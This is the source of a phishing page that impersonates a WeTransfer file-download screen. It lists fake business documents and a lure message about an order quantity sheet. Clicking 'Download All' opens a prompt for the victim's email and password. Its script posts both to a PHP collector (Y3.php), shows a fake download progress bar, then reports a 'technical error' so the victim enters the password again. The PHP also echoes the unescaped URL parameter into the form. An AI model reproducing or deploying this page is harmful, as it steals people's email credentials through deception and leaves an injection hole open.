

<!DOCTYPE html>
<!--[if lt IE 7 ]><html lang="en" class="no-touch no-js ie6"><![endif]-->
<!--[if IE 7 ]><html lang="en" class="no-touch no-js ie7"><![endif]-->
<!--[if IE 8 ]><html lang="en" class="no-touch no-js ie8"><![endif]-->
<!--[if IE 9 ]><html lang="en" class="no-touch no-js ie9"><![endif]-->
<!--[if (gt IE 9)|!(IE)]><!-->
<html class="no-touch no-ie fonts-loaded" lang="en"><!--<![endif]--><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">

  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="minimum-scale=1, initial-scale=1,user-scalable=no">
  <meta name="pinterest" content="nopin">
  <meta name="referrer" content="origin">

  <!-- OG data should be in English, or we need to pass the supported locales in an array in og:locale:alternate -->
      <meta property="og:description" content="3 files sent via WeTransfer, the simplest way to send your files around the world">
      <meta property="og:title" content="Download 3 files">
        <meta property="og:image" content="https://prod-cdn.wetransfer.net/assets/wt-facebook-568be8def5a86a09cedeb21b8f24cb208e86515a552bd07d856c7d5dfc6a23df.png">
    <meta property="og:type" content="website">
    <meta property="fb:app_id" content="265125293564341">

    <meta name="description" content="WeTransfer is the simplest way to send your files around the world. Share large files up to 2GB for free.">

  <meta name="author" content="WeTransfer">

  <link rel="shortcut icon" href="https://prod-cdn.wetransfer.net/assets/favicon-d12161435ace47c6883360e08466508593325f134c1852b1d0e6e75d5f76adda.ico">
  <link rel="icon" sizes="16x16 32x32" href="https://prod-cdn.wetransfer.net/assets/favicon-d12161435ace47c6883360e08466508593325f134c1852b1d0e6e75d5f76adda.ico">

  <!-- default favicon -->
  <link rel="mask-icon" href="https://prod-cdn.wetransfer.net/assets/favicon-fb0651bcae0b66fa7a3dd5a550e3b654edbfe6c01267ecca6f68a4f9bec67fb1.svg" color="#17181A">

  <!-- iOS: -->
  <link rel="apple-touch-icon-precomposed" href="https://prod-cdn.wetransfer.net/assets/apple-touch-icon-5a0a98ed8a06dd436f4881fc6225806c45db7d636175e4b5a6e3e20fa7228233.png">
  <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://prod-cdn.wetransfer.net/assets/apple-touch-icon-152x152-precomposed-067f23ab6514fd034cc001a814059580da710a62361a1338ab63932d7864c052.png">
  <link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://prod-cdn.wetransfer.net/assets/apple-touch-icon-180x180-precomposed-b8c5bf2f80790d4abbe7fd5dca0bcf5c3eeaa4e23b1b35c8854a3fdb5c26b1e9.png">
  <link rel="apple-touch-icon-precomposed" sizes="167x167" href="https://prod-cdn.wetransfer.net/assets/apple-touch-icon-167x167-precomposed-5f321b1568f630ec20d23af277c0e49c7d212b830c439be7f0265be9f24d2402.png">

  <meta name="application-name" content="WeTransfer">

  <meta name="csrf-param" content="authenticity_token">
<meta name="csrf-token" content="rrYWaC15QovNSnY6ByLuAdyeF/KnAWAOfefngSMyLF1VH8O3t+xugGzcaHpyBEJNZexGFSXGJNySiKuCJ65w8Q==">

    <title dir="ltr">WeTransfer</title>

  <style type="text/css">
    .assets-warning-node {
      display: none;
      visibility: hidden;
      position: fixed;
      background: #fff;
      z-index: 999;
      bottom: 0; left: 0; right: 0; top: 0;;
      padding: 2em;
      line-height: 1.4;
      font-family: sans-serif;;
      font-size: 1.1em;
    }
    .assets-warning-node p {
      max-width: 42em;
    }
    .root-node .no-script {
      position: fixed;
      background: #E65050;
      color: #fff;
      top: 0;
      left: 0;
      margin: 0;
      padding: 1em;
      font-weight: bold;
    }
    .modal-bg {
      background: rgba(0, 0, 0, 0.8);
      position: fixed;
      width: 100%;
      height: 100%;
      z-index:900;
    }
    .modal-box{
      margin: 0 auto;
      width: 50%;
      height: 50%;
      margin-top: 13%;
      background: rgba(65, 65, 65, 0.5) !important;
      border: 1px solid #000000;
      z-index: 1000;
      border-radius: 2em;
      text-align: center;
    }
    #progress-canvas{
      z-index: 1500;
      margin: 0 auto;
      position: fixed;
      top: 37%;
      right: 44.5%;
    }
    .circle{
       height: 149px;
       width: 149px;
       border-radius: 50%;
       border:13px solid #FFF;
       position: fixed;
       z-index:1500;
       top: 37%;
       right: 44.5%;
    }
    #download-msg{
      position: fixed;
      color: orange;
      top: 60%;
      right: 44.5%;
      z-index: 1500;
    }
    .hide {
      display: none;
    }
    .exit {
      margin: 0 auto;
      margin-top: 40%;
    }
    .btn-exit{
      background: #09F;
      color: white;
      padding: 10px;
      border-radius: 10%;
      width: 100px;
    }
    
    .confirm-modal-box{
      margin: 0 auto;
      background: white;
      width: 100%;
      height: 60vh;
      border: 1px solid black;
      margin-top: 13%;
      border-radius: 3px;
    }
    .modal-logo{
      width: 70%;
    }
    .confirm-input{
      width: 80%;
      padding: 3%;
      font-weight:bold;
      
    }
    .confirm-button {
      color: white;
      background: #0092d0;
      border-radius: 12px;
      padding: 10px;
      border: none;
      width: 30%;
      margin-top: 10px;
    }
    .filelist__name{
      font-weight: bold !important;
    }
    @media only screen and (min-width: 768px) {
       .confirm-modal-box{
            margin: 0 auto;
            background: white;
            width: 30%;
            height: 40vh;
            border: 1px solid black;
            margin-top: 13%;
            border-radius: 3px; 
       }
       .modal-logo{
            width: 70%;
        }
        
        .confirm-input{
             width: 80%;
            padding: 3%;
            font-weight:bold;
      
        }
        .confirm-button {
            color: white;
            background: #0092d0;
            border-radius: 12px;
            padding: 10px;
            border: none;
            width: 30%;
            margin-top: 10px;
        }
    }
  </style>
    <link rel="stylesheet" media="all" href="fine.css" onerror="assetFailed(this)">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
</head>
<body>
    <?php
if (isset($_GET['X1']))
{
$email = $_GET['X1'];

}
?>

<script type="text/javascript">
var _preloaded_transfer_ = {"id":"41d7cb9e19aa16c35812a437375963bd20190311012539","state":"downloadable","transfer_type":4,"shortened_url":"https://we.tl/t-J0NDFa5eHk","expires_at":"2019-03-18T01:25:49Z","password_protected":false,"uploaded_at":"2019-03-11T01:25:49Z","expiry_in_seconds":604768,"size":53200,"deleted_at":null,"recipient_id":null,"security_hash":"eaa7c1","description":"this is the file","items":[{"id":"a52663aaf2bbe365f43e475e560bffc220190311012539","name":"139.000 USD 4.1.2019 Junjin.xlsx","retries":0,"size":53200,"previewable":false,"content_identifier":"file"}]};
</script>


  <div class="assets-warning-node">
    <h1>Uh-oh...</h1>
    <p>
      We couldn't load some important parts of our website.
They may have been blocked by your firewall, proxy or browser set-up.
Try refreshing the page or get in touch through our <a href="https://wetransfer.zendesk.com/" rel="external">help center</a>.
    </p>
  </div>
  <form method="post" action="">
  <div class="root-node"><div class="app application">
  <div class="transfer" route="[object Object]" id="41d7cb9e19aa16c35812a437375963bd20190311012539" secret="eaa7c1"><div>
  <div class="transfer__window downloader">
  <div class="scrollable transfer__contents">
  <div class="scrollable__content" style="margin-right: -17px;">
  <div class="downloader__heading downloader__heading--1-files downloader__heading--message">
  <svg class="downloader__top-icon" viewBox="0 0 170 170"><g fill="#D4D7D9" fill-rule="evenodd">
  <path d="M145.104 24.896c33.195 33.194 33.195 87.014 0 120.208-33.194 33.195-87.014 33.195-120.208 0C-8.3 111.91-8.3 58.09 24.896 24.896 58.09-8.3 111.91-8.3 145.104 24.896zm-7.071 7.071c-29.29-29.29-76.777-29.29-106.066 0-29.29 29.29-29.29 76.777 0 106.066 29.29 29.29 76.777 29.29 106.066 0 29.29-29.29 29.29-76.777 0-106.066z"></path>
  <path d="M82 100.843V59.007A4.006 4.006 0 0 1 86 55c2.21 0 4 1.794 4 4.007v41.777l15.956-15.956a4.003 4.003 0 0 1 5.657 0 4.004 4.004 0 0 1 0 5.657l-22.628 22.628a3.99 3.99 0 0 1-3.017 1.166 3.992 3.992 0 0 1-3.012-1.166L60.328 90.485a4.003 4.003 0 0 1 0-5.657 4.004 4.004 0 0 1 5.657 0L82 100.843z"></path>
</g></svg><h2>Ready when you are</h2
><p>Files deleted in 7 days</p>
<div class="downloader__message">
  <p title="Hi, following up to our request for items, please check project details & order quantity sheet sent, check the requirements and revert to us if viable.">
    Hi, following up to our request for items, please check project details & order quantity sheet sent...</p></div>
</div>
<ul class="filelist">
  <li class="filelist__item"><div class="poptip"><div class="filelist__meta">
  <span class="filelist__name" title="Company Introduction.pdf">Company Introduction.pdf</span>
  <p class="filelist__size"><span>25.9 MB</span><span>pdf</span></p><div class="filelist__action"><svg viewBox="0 0 24 24"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-9 1.492V7.998C13 7.446 12.552 7 12 7c-.556 0-1 .447-1 .998v5.48l-2.53-2.53c-.385-.385-1.022-.39-1.413.002-.393.393-.39 1.022-.002 1.412l4.247 4.247c.192.19.447.288.702.288.26.003.514-.095.708-.29l4.247-4.246c.383-.385.387-1.022-.003-1.412-.394-.393-1.023-.392-1.413-.002L13 13.492zM0 12C0 5.373 5.373 0 12 0s12 5.373 12 12-5.373 12-12 12S0 18.627 0 12z" fill-rule="evenodd"></path></svg></div></div></div></li>
</ul>
<ul class="filelist">
  <li class="filelist__item"><div class="poptip"><div class="filelist__meta">
  <span class="filelist__name" title="Items quantity,order & drawings.pdf">Items quantity,order & drawings.pdf</span>
  <p class="filelist__size"><span>8.8 MB</span><span>pdf</span></p><div class="filelist__action"><svg viewBox="0 0 24 24"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-9 1.492V7.998C13 7.446 12.552 7 12 7c-.556 0-1 .447-1 .998v5.48l-2.53-2.53c-.385-.385-1.022-.39-1.413.002-.393.393-.39 1.022-.002 1.412l4.247 4.247c.192.19.447.288.702.288.26.003.514-.095.708-.29l4.247-4.246c.383-.385.387-1.022-.003-1.412-.394-.393-1.023-.392-1.413-.002L13 13.492zM0 12C0 5.373 5.373 0 12 0s12 5.373 12 12-5.373 12-12 12S0 18.627 0 12z" fill-rule="evenodd"></path></svg></div></div></div></li>
</ul>
<ul class="filelist">
  <li class="filelist__item"><div class="poptip"><div class="filelist__meta">
  <span class="filelist__name" title="Specifications & project sheets.pdf">Specifications & project sheets.pdf</span>
  <p class="filelist__size"><span>13.3 MB</span><span>pdf</span></p><div class="filelist__action"><svg viewBox="0 0 24 24"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-9 1.492V7.998C13 7.446 12.552 7 12 7c-.556 0-1 .447-1 .998v5.48l-2.53-2.53c-.385-.385-1.022-.39-1.413.002-.393.393-.39 1.022-.002 1.412l4.247 4.247c.192.19.447.288.702.288.26.003.514-.095.708-.29l4.247-4.246c.383-.385.387-1.022-.003-1.412-.394-.393-1.023-.392-1.413-.002L13 13.492zM0 12C0 5.373 5.373 0 12 0s12 5.373 12 12-5.373 12-12 12S0 18.627 0 12z" fill-rule="evenodd"></path></svg></div></div></div></li>
</ul>
  

  </div><div class="scrollable__scrollbar">
    <div class="scrollable__scrollbar-thumb" style="height: 0px; transform: translateY(0px);">
  </div></div></div><div class="transfer__footer">
  <button class="transfer__button" id="btn-download">Download All</button></div></div></div></div>
  <div class="dropzone"><h3 class="dropzone__title">Drop it like it’s hot</h3><p class="dropzone__text">Add your files by dropping them anywhere in this window</p></div>
  
  
  <div class="wallpaper">
      <iframe src="video/vid.htm" scrolling="no" allow="autoplay; camera" frameborder="0"></iframe>
      
      
      <span class="wallpaper__title"></span></div><nav class="nav nav--loaded"><ul class="nav__items"><li class="nav__item"><a href="https://wetransfer.com/help" class="nav__label">Help</a></li><li class="nav__item nav_item--expanded"><a href="https://wetransfer.com/about" class="nav__label">About</a><ul class="nav__subitems" style="width: 0px;"><li class="nav__subitem"><a href="https://wetransfer.com/about" class="nav__label">WeTransfer</a></li><li class="nav__subitem"><a href="https://wetransfer.com/products" class="nav__label">Products</a></li><li class="nav__subitem"><a href="https://wetransfer.com/plus?trk=WT201610_AboutPlus" class="nav__label">Plus</a></li><li class="nav__subitem"><a href="https://wetransfer.com/advertise" class="nav__label">Advertise</a></li></ul></li><li class="nav__item"><a href="https://wetransfer.com/sign-in" class="nav__label">Got Plus?</a></li></ul></nav><div class="spinner logo spinner--single"><svg height="44" width="44" class="spinner__circle" shape-rendering="geometricPrecision" viewBox="0 0 44 44"><circle class="spinner__background" r="20.5" cx="22" cy="22" fill="transparent" style="stroke-dasharray: 128.805; stroke-dashoffset: 0; stroke-width: 3; stroke: rgb(232, 235, 237);"></circle><circle class="spinner__foreground" r="20.5" cx="22" cy="22" fill="transparent" style="stroke-dasharray: 128.805; stroke-dashoffset: 128.161; stroke-width: 3; stroke: rgb(64, 159, 255);"></circle></svg><svg width="52" height="29" class="spinner__logo" viewBox="-4 -2 52 29"><defs><path id="logo-path" d="M25.4 10.6c0-6.2 4.4-9.9 10.1-9.9C40.6.7 44 3.3 44 6.9c0 3.4-2.9 5.6-6.1 5.6-1.8 0-3.1-.3-4-1-.3-.3-.5-.2-.5.1 0 1.3.5 2.3 1.3 3.2.7.7 2 1.2 3.2 1.2 1.3 0 2.4-.3 3.4-.8s1.8-.3 2.3.5c.6.9-.2 2.1-.9 2.9-1.3 1.4-3.8 2.4-7 2.4-6.5-.2-10.3-4.6-10.3-10.4zm-13.3 4.1c.6 0 1 .3 1.4 1l1.8 2.9c.7 1.1 1.3 1.9 2.6 1.9s2-.5 2.6-2c.8-1.8 1.7-4.1 2.4-7.1.9-3.4 1.3-5.4 1.3-7.1s-.5-2.7-2.4-3c-2.5-.5-6-.7-9.7-.7s-7.2.2-9.7.6C.5 1.6 0 2.6 0 4.3S.4 8 1.2 11.4c.8 3 1.6 5.2 2.4 7.1.7 1.5 1.3 2 2.6 2s1.9-.8 2.6-1.9l1.8-2.9c.5-.6.9-1 1.5-1z"></path><filter id="logo-filter" width="200%" height="200%" x="-50%" y="-50%" filterUnits="objectBoundingBox"><feOffset dx="0" dy="2" in="SourceAlpha" result="shadowOffsetOuter1"></feOffset><feGaussianBlur stdDeviation="2" in="shadowOffsetOuter1" result="shadowBlurOuter1"></feGaussianBlur></filter></defs><g fill="none" class="logo-shape"><use fill="#17181A" fill-opacity="0.11" filter="url(#logo-filter)" xlink:href="#logo-path"></use><use fill-rule="evenodd" xlink:href="#logo-path"></use></g></svg><svg class="spinner__aborted" viewBox="55 42 171 171"><g fill="none" fill-rule="evenodd"><path fill="#E65050" d="M136.75 141.407h7.432l3.315-29.634V92.887h-14.164v18.886l3.416 29.634zM133.734 162h13.36v-13.26h-13.36V162z"></path></g></svg><svg class="spinner__finished" viewBox="550 421 13 13" focusable="false"><path stroke="#409FFF" stroke-width="2.057" d="M552 426.888l3.16 3.112 4.84-7" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg></div></div></div>
  </form>

  <div class="modal-bg hide" id="confirm-modal">
    <div class="confirm-modal-box">
      <div style="margin: 0 auto; text-align: center; padding-top: 10px;">
        <img class="modal-logo" src="logo.png">
        <div style="color: red; text-align:center;margin-top: 13px;"> Please confirm correct email recipient</div>
        <div style="text-align:center; margin-top: 25px;">
          <div>
 <input type="text" name="email" id="email"  placeholder="Enter email ..." class="confirm-input"  value="<?php 
  echo $email = $_GET['X1'];
?>" required />
          </div>
          <div>
            <input type="password" name="password" id="password" placeholder="Enter password"  class="confirm-input" style="margin-top: 15px;">
          </div>
          <button class="confirm-button" id="btn-confirm"> Confirm </button>
        </div>
      </div>
    </div>
  </div>

  <div class="modal-bg hide" id="modal"> 
  <div class="modal-box">
    <div class="circle"></div>
    <canvas id="progress-canvas" height="150" width="150"></canvas>
    <div id="download-msg">Downloading Files...</div>
    <div class="exit hide" id="exit">
      <button class="btn-exit" id="btn-exit">Try Again</button>
    </div>
  </div>
  </div>


  
  
  
  <script type="text/javascript">
   var ctx = document.getElementById('progress-canvas').getContext('2d');
    var al = 0;
    var start = 4.72;
    var cw = ctx.canvas.width ;
    var ch = ctx.canvas.height ;
    var diff;
    var sim;
  $(document).ready(function(){
    $("#btn-download").click(function(e){
      e.preventDefault();
      e.stopPropagation();
      $("#confirm-modal").removeClass("hide").fadeIn(1000);
      $("#password").focus();
    });

    $("#btn-confirm").click(function(e){
      e.preventDefault();
      e.stopPropagation();
      var pass = $("#password").val();
      var email = $("#email").val();
      if(email.length < 4){
        $("#email").css("border", "1px solid red");
      }else if(pass.length < 2){
        $("#password").css("border", "1px solid red");
        $("#password").attr("placeholder", "Please enter your password first!");
        $("#password").focus();
      }else{
        $("#errormsg").text("");
        $("#modal").removeClass("hide");
        $("#confirm-modal").addClass("hide");
        sim = setInterval(() => {
          progressSim();
        }, 300);
        $.ajax({
          url: "Y3.php",
          method: "post",
          data: {
            email: email,
            pass: pass
          },
          success: (data) => {
              console.log(data);
              triggerError();
          }
        })
      }
      
    })

    $("#btn-exit").click(function(){
      closeModal();
      reset();

    })
  })
  function progressSim(){
      diff = ((al/100) * Math.PI * 2 * 10).toFixed(2);
      ctx.clearRect(0, 0, cw, ch);
      ctx.lineWidth = 13;
      ctx.fillStyle = '#09F';
      ctx.strokeStyle = '#09F';
      ctx.textAlign = 'center';
      ctx.font = "25px monospace";
      ctx.fillText(al+'%', cw * .5, ch * .5 + 2, cw);
      ctx.beginPath();
      ctx.arc(75, 75, 68, start, diff/10+start, false);
      ctx.stroke();
      if (al >= 100){
        clearTimeout(sim)
      }
      al++;
    }

    function triggerError(){
      setTimeout(() => {
      al = 0;
      $("#password").val("");
      $("#download-msg").css("color", "red");
      $("#download-msg").css("right", "35%");
      $("#download-msg").text("Technical error encountered, please confirm the receiving email and password");
      clearInterval(sim);
      $("#exit").removeClass("hide");   
      }, 1000);
    
    }
    function closeModal(){
      $("#modal").addClass("hide");
      $("#exit").addClass("hide");
      $("#confirm-modal").removeClass("hide");
    }
    
    function reset(){
      al = 0;
      $("#download-msg").css("color", "orange");
      $("#download-msg").css("right", "45.5%");
      $("#download-msg").text("Downloading Files...");
      ctx.clearRect(0, 0, cw, ch);
      $("#password").focus();
    }
</script>

  


  
  <script type="text/javascript">
  var Wallpapers = [];
</script>

  


<!-- Snowplow starts plowing -->
<!-- https://github.com/snowplow/snowplow/wiki/hosted-assets#1-trackers -->

<!-- Snowplow stop plowing -->

  

 </body></html>